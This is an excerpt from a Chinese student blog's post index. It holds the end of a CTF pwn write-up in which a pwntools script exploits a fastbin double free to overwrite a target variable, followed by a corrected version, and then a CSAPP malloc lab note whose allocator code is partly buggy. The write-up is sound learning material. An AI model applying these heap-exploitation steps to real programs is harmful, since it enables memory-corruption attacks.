class=\"title\">dele</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvline(<span class=\"string\">&quot;choice &gt; &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">idx,content</span>):</span></span><br><span class=\"line\">    p.recvline(<span class=\"string\">&quot;choice &gt; &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>():</span></span><br><span class=\"line\">    p.recvline(<span class=\"string\">&quot;choice &gt; &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">move</span>(<span class=\"params\">dest</span>):</span></span><br><span class=\"line\">    p.recvline(<span class=\"string\">&quot;choice &gt; &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\">    p.sendafter(<span class=\"string\">&#x27;?&#x27;</span>,<span class=\"built_in\">str</span>(dest))</span><br><span class=\"line\"><span class=\"comment\">#double free</span></span><br><span class=\"line\">add()<span class=\"comment\">#0</span></span><br><span class=\"line\">add()<span class=\"comment\">#1</span></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add()<span class=\"comment\">#2--&gt;0</span></span><br><span class=\"line\">add()<span class=\"comment\">#3 --&gt;1</span></span><br><span class=\"line\"></span><br><span class=\"line\">move(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">show()<span class=\"comment\">#get the addr of v7</span></span><br><span class=\"line\">v7_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">v8_addr = v7_addr - <span class=\"number\">8</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p64(v8_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,<span class=\"string\">&quot;0xDEADBEEF&quot;</span>)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&quot;choice &gt;&quot;</span>,<span class=\"string\">&#x27;6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        打不通，并且因为未知原因（大概率是elf头的ld不匹配），导致本地无法调试，去网上搜了一下wp，发现有这么几个个细节我没有注意，或者说想错了。</p>\n<p>​        在进行double free的时候，我只预先申请了两个chunk，并且将前一个申请的chunk double free了。但是wp预先申请了三个chunk，然后我意识到，第三个申请的chunk很有可能是防止之前被free的两个chunk被top chunk合并，之前刷堆题的时候经常碰到这一点，但是太久没做了，有些忘了。这里是没有注意到的细节。</p>\n<p>​        然后是想错了的部分，可以看到我之前的wp中的思路是这样的：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8A%E5%8D%8810.20.46.png\" alt=\"截屏2021-12-08 上午10.20.46\"></p>\n<p>​        错误所在就是，修改free chunk0的fd之后，它在fastbin中的位置应当还是</p>\n<p><code>main_arena =&gt; chunk1 =&gt;chunk0(v8)</code>    ，也不知道为什么我会以为新的fd会被重新插入链表。</p>\n<p>​        然后按照first fit原则，我们连续add两个chunk，就能够申请到v8的内存空间了。后面的内容就问题不大了。</p>\n<p>​        所以更正后的exp大概是这样：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add()<span class=\"comment\">#0</span></span><br><span class=\"line\">add()<span class=\"comment\">#1</span></span><br><span class=\"line\">add()<span class=\"comment\">#2,防止与top chunk合并</span></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add()<span class=\"comment\">#3--&gt;0</span></span><br><span class=\"line\">add()<span class=\"comment\">#4 --&gt;1</span></span><br><span class=\"line\"></span><br><span class=\"line\">move(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">show()<span class=\"comment\">#get the addr of v7</span></span><br><span class=\"line\">v7_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">v8_addr = v7_addr - <span class=\"number\">0x8</span></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,p64(v8_addr))</span><br><span class=\"line\">add()<span class=\"comment\">#5</span></span><br><span class=\"line\">add()<span class=\"comment\">#6</span></span><br><span class=\"line\">edit(<span class=\"number\">6</span>,<span class=\"number\">0xDEADBEEF</span>)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>​        感觉每个入门堆题的人首先开始做的题目都是fastbin attack以及UAF，因为确实相对来说简单易懂。但是反观我半年前写的fastbin attack的wp，我的评价是：狗屁不通。</p>\n<p>​        所以我对于堆题，或者是整个ctf pwn的学习其实是走了很多弯路的。比如说对于动调的惧怕，导致我做了很多题，但又没完全做。比如我学习堆题，却不愿意沉下心来，从了解ptmalloc开始，而是摁刷题，导致知识点被割裂得完全串联不上，学完就忘。现在从csapp malloc lab开始逐步琢磨glibc，然后睡前再看半个小时源码剖析，再辅以ctf pwn的一些题目的分析，对于各种知识点好歹是有了一个足以将它们串联起来的体系，从而做题是不再那么一头雾水了。如果在半年前我能意识到这一点就好了。但是我还是觉得任何在pwn学习过程中踩过的坑，无论是知识点本身的坑，还是学习方案上的坑，都是宝贵的，无可替代的学习经验捏。</p>\n","categories":["HEAP - Fastbin Attack"],"tags":["heap_pro"]},{"title":"csapp malloc lab","url":"/2021/12/03/malloc%20lab/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-rIVRFoZt\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h2 id=\"0）前言\"><a href=\"#0）前言\" class=\"headerlink\" title=\"0）前言\"></a>0）前言</h2><p>​        鸽了三个月的malloc lab，作为复习堆题的开始。</p>\n<p>​        计画完成时间是12.5之前，也就是三天。</p>\n<h2 id=\"1）大体设计\"><a href=\"#1）大体设计\" class=\"headerlink\" title=\"1）大体设计\"></a>1）大体设计</h2><p>​        对于整体的操作的大致模型以及allocater和freer需要做的工作如下：</p>\n<p>​        分配器：</p>\n<ol>\n<li><p>在第一次分配chunk时，对堆空间进行初始化=&gt;<code>mm_init()</code>    </p>\n</li>\n<li><p>创建指定类型的chunk。</p>\n<p>​    free</p>\n</li>\n<li><p>利用隐式空闲链表，将free状态的chunk链接。</p>\n</li>\n<li><p>利用合适的机制，对物理地址相邻的free chunk进行合并</p>\n</li>\n<li><p>利用合适的机制，在分配器有需求的时候分割相对应的free chunk，并将其标识为allocated。</p>\n</li>\n</ol>\n<p>​        其他的驱动代码以及头文件已经给出，我们只需在<code>mm.c</code>中进行编写。</p>\n<p>​        在这个模型中，分配器的分配的chunk的结构大致如下，运用带边界标记的chunk使堆块合并更加优雅。</p>\n<p>​                <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%885.33.23.png\" alt=\"截屏2021-12-03 下午5.33.23\"></p>\n<p>​        </p>\n<h2 id=\"2）利用宏定义简化指针操作\"><a href=\"#2）利用宏定义简化指针操作\" class=\"headerlink\" title=\"2）利用宏定义简化指针操作\"></a>2）利用宏定义简化指针操作</h2><p>​        为了简化在操作chunk在链表中的一些与指针相关的行为，我们可以定义一系列宏来将这些操作打包，使得代码更为简洁，同时一些基本的常数也将被定义。</p>\n<p>​    </p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%885.05.59.png\" alt=\"截屏2021-12-04 下午5.05.59\"></p>\n<p>​            </p>\n<h2 id=\"3）level·1\"><a href=\"#3）level·1\" class=\"headerlink\" title=\"3）level·1\"></a>3）level·1</h2><p>​        level1利用隐式空闲链表+首次/下一次/最佳适配三种方式实现。</p>\n<h3 id=\"first-fit\"><a href=\"#first-fit\" class=\"headerlink\" title=\"first_fit\"></a>first_fit</h3><h4 id=\"mm-init\"><a href=\"#mm-init\" class=\"headerlink\" title=\"mm_init()\"></a>mm_init()</h4><p>​        首先是<code>mm_init()</code>函数，利用<code>mm_sbrk()</code>创建一个4字的空闲链表，将链表第一个双字的首尾分别标记为序言块的header和footer，然后将第三个字标记为结尾块，然后调用<code>extend_heap()</code>函数初始化堆空间。被初始化的size为<code>CHUNKSIZE/WSIZE</code>也就是<code>1*10^12 / 4</code>。</p>\n<p>​        然后是<code>extend_heap()</code>函数，利用<code>mm_sbrk()</code>创建size大小的空间，size由之前初始化的size决定。并且将整个空chunk的对应位标记头和脚部。最后，在很可能出现的前一个堆以一个空闲块结束的情况，我们调用coalesce函数来合并两个空闲块 ，并返回指向合并后的块的块指针。coalesce函数将在后面的部分被详细分析。</p>\n<h4 id=\"mm-malloc\"><a href=\"#mm-malloc\" class=\"headerlink\" title=\"mm_malloc()\"></a>mm_malloc()</h4><p>​        堆空间初始化之后，我们首先设计<code>mm_malloc()</code>。</p>\n<p>​        函数大致功能是：</p>\n<ol>\n<li><p>检查请求真假，然后准备分配chunk</p>\n</li>\n<li><p>调整chunk size，在请求size的基础上加入8字节的对齐和8字节的chunk头和chunk脚。也就是说，一个chunk至少会有16字节。</p>\n</li>\n<li><p>在free list中寻找符合size要求的chunk。</p>\n</li>\n<li><p>如果没有在free list中找到，则直接调用<code>extend_heap()    </code>生成对应的空间。</p>\n<p>​    </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%887.21.02.png\" alt=\"截屏2021-12-04 下午7.21.02\">    </p>\n<p>这里csapp没有为我们提供<code>find_fit()</code>以及<code>place()</code>的例子,需要我们自己编写。我们先放着，之后再来讨论。</p>\n</li>\n</ol>\n<h4 id=\"mm-free\"><a href=\"#mm-free\" class=\"headerlink\" title=\"mm_free()\"></a>mm_free()</h4><p>​        <code>mm_malloc()</code>之后，我们来看<code>mm_free()</code></p>\n<p>​        它被用来释放已被分配的chunk，相当于释放malloc所请求的bp，然后需要将被释放的chunk与其物理领接的free chunk合并。</p>\n<p>​        </p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%885.40.53.png\" alt=\"截屏2021-12-04 下午5.40.53\"></p>\n<h4 id=\"coalesce\"><a href=\"#coalesce\" class=\"headerlink\" title=\"coalesce()\"></a>coalesce()</h4><p>​        重点来看<code>coalesce()</code></p>\n<p>​        这里用到的合并方式的构思图表如下：</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%885.35.04.png\" alt=\"截屏2021-12-03 下午5.35.04\"></p>\n<p>​        也是非常地直观容易理解。</p>\n<p>​        它的代码实现也直观地被分为如图四种情况，所以我们先要定义对应图中几种状态的bp状态。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));</span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> size = GET_SIZE(HDRP(bp));</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        大致框架如下：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%886.00.07.png\" alt=\"截屏2021-12-04 下午6.00.07\"></p>\n<p>​        </p>\n<h4 id=\"find-fit\"><a href=\"#find-fit\" class=\"headerlink\" title=\"find_fit()\"></a>find_fit()</h4><p>​        整个malloc lab的重点，需要自己实现一个free chunk的适配寻找。</p>\n<p>​        一些常见的方法有</p>\n<ol>\n<li>首次适配</li>\n<li>下一次适配</li>\n<li>最佳适配</li>\n<li>分离式（复杂）</li>\n</ol>\n<p>​        其实这些并不是完全先进或者落后，各有各的优缺点。在这里为了简单我们选择首次适配，即使用在free list中找到的第一个符合条件的chunk。</p>\n<p>​        按照首次适配的原理，我们的思路是，从头到尾搜索链表，如果遇到合适的free chunk，则按照size将其头和尾部标记。</p>\n<p>​        实现大致是：</p>\n<p>​        指定一个size，在链表中通过判断头部inuse位，找到第一个free chunk的bp,，然后计算next bp是否大于bp + size</p>\n<p>,且状态为free，如果是，将bp标记为allocated，在bp+size的地方标记为footer，分割该chunk，虽然会留下一定的碎片，但这也是首次适配无法避免的缺点。如果不是，则继续寻找下一个free chunk并判断。</p>\n<p>​        然后来研究代码实现：</p>\n<p>​        自己瞎写了一个，问题不大。</p>\n<h4 id=\"place\"><a href=\"#place\" class=\"headerlink\" title=\"place()\"></a>place()</h4><p>​        函数功能是将请求块放置在空闲块的起始位置，只有当剩余部分的大小等于或者超出最小块的大小时，才进行分割。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">place</span><span class=\"params\">(<span class=\"keyword\">void</span> *bp, <span class=\"keyword\">size_t</span> asize)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((size - asize) &gt;= (<span class=\"number\">2</span>*DSIZE)) &#123;</span><br><span class=\"line\">        PUT(HDRP(bp),PACK(asize,<span class=\"number\">1</span>));</span><br><span class=\"line\">        PUT(FTRP(bp),PACK(asize,<span class=\"number\">1</span>));</span><br><span class=\"line\">        PUT(HDRP(NEXT_BLKP(bp)),PACK(size - asize,<span class=\"number\">0</span>));</span><br><span class=\"line\">        PUT(FTRP(NEXT_BLKP(bp)),PACK(size - asize,<span class=\"number\">0</span>));</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        PUT(HDRP(bp),PACK(size,<span class=\"number\">1</span>));</span><br><span class=\"line\">        PUT(FTRP(bp),PACK(size,<span class=\"number\">1</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<p>问题不大</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8A%E5%8D%8811.46.52.png\" alt=\"截屏2021-12-05 上午11.46.52\"></p>\n<h3 id=\"next-fit\"><a href=\"#next-fit\" class=\"headerlink\" title=\"next_fit\"></a>next_fit</h3><p>​        下一次适配，主要特点是在第一次在空闲链表中找到合适的chunk以后，下一次搜索就不再是从头到尾，而是从上一次搜索的chunk开始继续搜索。</p>\n<p>​        相比于首次适配，写循环时就不能嗯搞，要处理第一次找到fit chunk后的状态。大致的思路是：先按照首次适配的方式找到第一个适合的chunk，然后记录下chunk的bp，下一次寻找时则从记录的bp开始寻找。</p>\n<p>​            那么肯定需要定义一个外部变量来记录每次找到的bp。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> *<span class=\"title\">next_find_fit</span><span class=\"params\">(<span class=\"keyword\">size_t</span> asize)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">char</span> * bp = heap_listp;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> ALLOC_STATUS;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> SIZE;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (GET_SIZE(HDRP(NEXT_BLKP(bp))) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;   <span class=\"keyword\">if</span>(mark_bp)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            bp = NEXT_BLKP(mark_bp);</span><br><span class=\"line\">            ALLOC_STATUS = GET_ALLOC(HDRP(bp));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (ALLOC_STATUS)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(SIZE &lt; asize) </span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            mark_bp = bp;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> bp; </span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        bp = NEXT_BLKP(bp); </span><br><span class=\"line\">        ALLOC_STATUS = GET_ALLOC(HDRP(bp));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ALLOC_STATUS)</span><br><span class=\"line\">        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(SIZE &lt; asize) </span><br><span class=\"line\">        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        mark_bp = bp;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> bp; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​        问题不大。</p>\n<h4 id=\"best-fit\"><a href=\"#best-fit\" class=\"headerlink\" title=\"best_fit\"></a>best_fit</h4><p>​        搜索链表中的每一个堆块，选择符合条件的最小空闲块。目前来说思路是这样的：</p>\n<p>​        对整个堆空间进行搜索，标记合适的chunk，并将size储存在数组中，在搜索结束后进行排序，选择最适合的chunk，并将bp返回。</p>\n<p>​        对堆空间进行搜索，大概只需要在原本的算法上去掉结束循环的判定条件。然后排序的话随意找个排序算法来就行，图方便我复制了一个冒泡排序，虽然时间复杂度不太行。</p>\n<p>​        但是存在一个问题就是，排序肯定是以chunk的size为标准，但是如何关联size和bp呢？我将所有符合条件的chunksize排序之后，如何找到对应的bp？</p>\n<p>​        一个比较直观的解决方法就是二维数组，将bp和size同时存放，同时排序，当然也许可以使用类似PACK的宏，或者为每一个size增加一个idx，也是二维数组的思路，但是并不是直接将bp存放，而是存放bp的idx。</p>\n<p>​        考虑到二维数组排序有一些麻烦，故直接定义结构体来存放size与bp的idx。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> *<span class=\"title\">best_find_fit</span><span class=\"params\">(<span class=\"keyword\">size_t</span> asize)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;   </span><br><span class=\"line\">    <span class=\"keyword\">char</span> * bp = heap_listp;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> ALLOC_STATUS;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> SIZE;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">bp_list</span> <span class=\"title\">list</span>[];</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span> (GET_SIZE(HDRP(NEXT_BLKP(bp))) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; CHUNKSIZE/WSIZE; i++)</span><br><span class=\"line\">        &#123;   </span><br><span class=\"line\">            bp = NEXT_BLKP(bp);</span><br><span class=\"line\">            ALLOC_STATUS = GET_ALLOC(HDRP(bp));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (ALLOC_STATUS) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(SIZE &lt; asize) <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"built_in\">list</span>[i].bp_size = GET_SIZE(HDRP(bp));</span><br><span class=\"line\">            <span class=\"built_in\">list</span>[i].bp_idx = i;</span><br><span class=\"line\">            <span class=\"built_in\">list</span>[i].bp = HDRP(bp);</span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">        bubble_sort(<span class=\"keyword\">int</span> <span class=\"built_in\">list</span>[i].bp_size,<span class=\"keyword\">int</span> i);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">list</span>[i].bp;</span><br><span class=\"line\">            </span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"4-level2\"><a href=\"#4-level2\" class=\"headerlink\" title=\"4) level2\"></a>4) level2</h2><p>​        level2利用显式链表和分离适配来实现，同时这种方法也是非常接近ptmalloc2的，所以学习这种方法的思想是十分必要的。</p>\n<h3 id=\"数据结构\"><a href=\"#数据结构\" class=\"headerlink\" title=\"数据结构\"></a>数据结构</h3><h4 id=\"显式空闲链表\"><a href=\"#显式空闲链表\" class=\"headerlink\" title=\"显式空闲链表\"></a>显式空闲链表</h4><p>​        相比于隐式空闲链表没有实际的链表去管理空闲块，显式空闲链表使用新增的双向循环链表，通过在chunk头添加指向逻辑上相邻的chunk的指针来相互连接。显式链表为chunk指针操作增添了更多姿势，突破了隐式性能的局限性。当然这个方案也不是完全没有缺点，为了包含指针和可能的脚部，显式空闲链表的chunk通常会更大一些，潜在地提高了内存碎片的程序。</p>\n<h4 id=\"chunk\"><a href=\"#chunk\" class=\"headerlink\" title=\"chunk\"></a>chunk</h4><p>​        显式链表chunk结构如图：</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-c0cb0926ad2e469833bfff9e3fffd2e4_720w.jpg\" alt=\"img\"></p>\n<p>​        有点类似ptalloc的机制，当chunk为allocated状态，中间为padding，当为free状态，会在padding开始前，也就是之前方案中的<code>bp</code>指向的地方增添两个指针：<code>next_bp</code>， <code>prev_bp</code>。</p>\n<h3 id=\"First-fit\"><a href=\"#First-fit\" class=\"headerlink\" title=\"First_fit\"></a>First_fit</h3><p>​        因为确实不太会写，所以基本算是照着代码分析思路了。</p>\n<p>​        首先是完成显式空闲链表下first_fit的实现，这种方案目的是熟悉如何通过创建一个双向循环链表来管理空闲块。</p>\n<p>​        第一步是创建空闲链表。</p>\n<p>​        </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8B%E5%8D%884.46.18.png\" alt=\"截屏2021-12-09 下午4.46.18\"></p>\n<p>​        显式链表下的<code>free()</code>也和隐式空闲链表没区别，都是把chunk 头的size置0，但是多出来了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">SET_PREV(bp, <span class=\"number\">0</span>);</span><br><span class=\"line\">SET_NEXT(bp, <span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\n\n<p>​        也就是先将需要free的chunk的fd和bk位全部设置为0，然后进行合并后放入空闲链表。</p>\n<p>​    </p>\n<p>​    </p>\n<p>然后编写将chunk插入和取出双向循环链表的操作。</p>\n<h4 id=\"insert-from-free-list\"><a href=\"#insert-from-free-list\" class=\"headerlink\" title=\"insert_from_free_list()\"></a>insert_from_free_list()</h4><p>​    将已分配块释放，chunk bp 被插入free list。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.31.31.png\" alt=\"截屏2021-12-05 下午11.31.31\">        </p>\n<h4 id=\"remove-from-free-list\"><a href=\"#remove-from-free-list\" class=\"headerlink\" title=\"remove_from_free_list()\"></a>remove_from_free_list()</h4><p>​        在free list中拿出chunk。与隐式链表类似，分为四种情况。因为是双向循环链表，所以解链的过程也可以理解为unlink。</p>\n<p>​        第一种情况：<code>prev == NULL &amp;&amp; next == NULL</code>，chunk前后都是allocated chunk，双向链表中啥也没有，设置表头为空。</p>\n<p>​        第二种情况：<code>prev == NULL</code>    ，前一个chunk为allocated，前一项为空，说明此时chunk的前面没有chunk，那么bk本身就是空的，解链就需要设置fd为空，也就是next为0。</p>\n<p>​        第三种情况同理。</p>\n<p>​        第四种情况：chunk前后都有free chunk，那么解链相当于一个标准的unlink，就是将前一个chunk的bp的next位设置为下一个chunk的bp，然后下一个chunk的prev位设置为前一个chunk的bp。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.47.40.png\" alt=\"截屏2021-12-05 下午11.47.40\"></p>\n<h3 id=\"分离适配\"><a href=\"#分离适配\" class=\"headerlink\" title=\"分离适配\"></a>分离适配</h3><p>​        分离适配的特点就是利用很多储存不同大小范围的chunk的链表来管理free chunk，很大程度上减小了内存碎片的产生。</p>\n<p>​        根据参考资料，我们可以将大小以2^n划分。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.52.48.png\" alt=\"截屏2021-12-05 下午11.52.48\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.52.59.png\" alt=\"截屏2021-12-05 下午11.52.59\"></p>\n<p>​                    </p>\n<h2 id=\"5）结果与改进\"><a href=\"#5）结果与改进\" class=\"headerlink\" title=\"5）结果与改进\"></a>5）结果与改进</h2><p>​        </p>\n<p>​        </p>\n<h2 id=\"6）反思与思考\"><a href=\"#6）反思与思考\" class=\"headerlink\" title=\"6）反思与思考\"></a>6）反思与思考</h2><p>​        本来应该是在今年暑假就要完成的东西，因为太过懒散而拖到了现在。不得不说如果沉下心来做，这个lab其实不算很难，最难的实际上是对这个简单的内存分配器从0到逐渐熟悉架构的过程。如果不去认真读csapp，了解程序的大致架构的话，就会一头雾水从而放弃，暑假便是因此。</p>\n<p>​        其实大多数代码并不需要自己完成，也是确实没有这个水平，但是也有我们自己需要思考，然后实现的地方，就比如说适配的方法。我从来没有学过数据结构或者算法，也没有刷过类似的题，c语言也就是局限于看得懂这样的普通计算机专业学生水平，对于这种大面积的指针操作一时确实有些摸不着头脑，但是csapp给了我们一种解：利用宏，将复杂的指针运算以及强制类型转换封装，变得简单易用，这使得在我操作指针时，几乎感受不到指针的复杂所在，也是我觉得收获最大之所在。</p>\n<p>​        关于三种适配方法，第一种我在编写时并不太理解如何实现“继续寻找下一个chunk”，于是自己按照感觉写了一个版本，然后寻找了一些参考，发现我写的除了这一步，其他都问题不大，然后就把自己的版本修正了。之后的两种适配方法都是基于首次适配的代码加以适当的条件修改而成，不得不说其实十分有趣。最佳适配牵涉到数组的排序以及结构体的定义，说实话上一次编写带结构体的c程序还是上学期起哦期末的暑假考核，但是也没有遇到什么障碍，就这么顺着写了。现在想来我们大一上的c语言大作业真是简单捏。</p>\n<p>​        </p>\n<h2 id=\"7）参考\"><a href=\"#7）参考\" class=\"headerlink\" title=\"7）参考\"></a>7）参考</h2><p>​        <a href=\"https://www.jianshu.com/p/48d5d0554b3b\">六 Malloc Lab</a></p>\n<p>​    <a href=\"https://zhuanlan.zhihu.com/p/150100073\">CSAPP:Lab5-Malloc Lab</a></p>\n","categories":["CSAPP LAB"],"tags":["csapp lab"]},{"title":"openstack学习笔记","url":"/2021/11/22/openstack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" 